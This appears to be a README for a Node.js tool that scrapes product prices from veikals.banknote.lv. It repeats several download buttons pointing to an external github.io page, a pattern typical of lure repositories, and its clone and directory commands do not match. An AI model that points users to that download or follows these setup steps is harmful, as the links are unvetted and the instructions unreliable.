# Banknote Price Checker v2026 - price checker 2026

> **Banknote Price Checker is a Node.js utility for checking prices on veikals.banknote.lv. It searches the catalog, filters matching products, handles API pagination, and saves results as JSON or HTML.**

[![Platform](https://img.shields.io/badge/Platform-Node.js-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/swood1969/banknote-price-checker-2026?style=flat-square)](https://github.com/swood1969/banknote-price-checker-2026)

---

<p align="center">
  <a href="https://swood1969.github.io/banknote-price-checker-2026/">
    <img src="https://img.shields.io/badge/Download-Banknote%20Price%20Checker%20Latest-brightgreen?style=for-the-badge" alt="Download Banknote Price Checker">
  </a>
</p>

> **[Download Banknote Price Checker v2026](https://swood1969.github.io/banknote-price-checker-2026/)**

---

[Download Latest Build](https://swood1969.github.io/banknote-price-checker-2026/)

---

## Overview

Banknote Price Checker provides a practical way to review product listings and prices from veikals.banknote.lv. Rather than handling individual catalog results manually, you can combine product searches, filters, and result processing in a single workflow.

It is suitable for recurring catalog checks and organized data review. API pagination is handled automatically, allowing the checker to continue across multiple result pages and collect a larger set of matches.

---

## What It Does

- Retrieves product prices from veikals.banknote.lv
- Searches products using configurable filter options
- Narrows results with search and exclude parameters
- Moves through paginated API responses automatically
- Writes collected results to JSON files
- Produces HTML reports for convenient viewing
- Runs locally with Node.js
- Works with Docker Compose and GitHub Actions workflows

---

## Getting Started

Download the repository, enter its directory, and install the required packages:

```bash
git clone https://github.com/swood1969/banknote-price-checker-2026.git
cd banknote_price_checker
npm install
```

After installation, launch the checker with Node.js, or use the Docker Compose or GitHub Actions method appropriate for your setup.

---

## Running a Check

Provide the search and filtering values you need, start the checker, and inspect the generated report files.

A standard run consists of these steps:

1. Define the search terms and any values that should be excluded.
2. Start a check against the Banknote catalog.
3. Allow the application to process all available API pages.
4. Review the resulting JSON or HTML files.

To launch it directly with Node.js:

```bash
node index.js
```

For Docker Compose or GitHub Actions usage, apply the repository's setup instructions for that option and pass the same search parameters through the relevant configuration.

---

## Options and Configuration

The runtime and launch options control the search behavior and output format. Search terms, filters, and exclude values are among the main inputs.

For example:

```json
{
  "search": "banknote",
  "exclude": ["example"],
  "output": {
    "json": true,
    "html": true
  }
}
```

When running through Docker or GitHub Actions, place the equivalent values in the container environment or workflow configuration.

---

## Prerequisites

- Node.js for running the tool locally
- Connectivity to API responses from veikals.banknote.lv
- Available disk space for JSON and HTML exports
- Docker and Docker Compose for container-based execution
- GitHub Actions support for automated CI runs

---

## Frequently Asked Questions

**How can I update Banknote Price Checker?**  
Pull the newest changes from the repository and reinstall dependencies when necessary. Docker users should refresh the image, while GitHub Actions users should update the workflow configuration as appropriate.

**Where does the checker write its output?**  
Results are saved as JSON and HTML files. Look in the configured output directory once the run has completed.

**Can the search scope be customized?**  
Yes. Custom filters, search values, and exclude parameters can be combined to control which products are collected.

**Does it support results spanning several API pages?**  
Yes. Pagination is automatic, and the checker continues processing available pages until the request is complete.

**Is Node.js required?**  
Node.js is used for direct local execution. Docker Compose provides a container-based option, and GitHub Actions can be used for automated runs.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
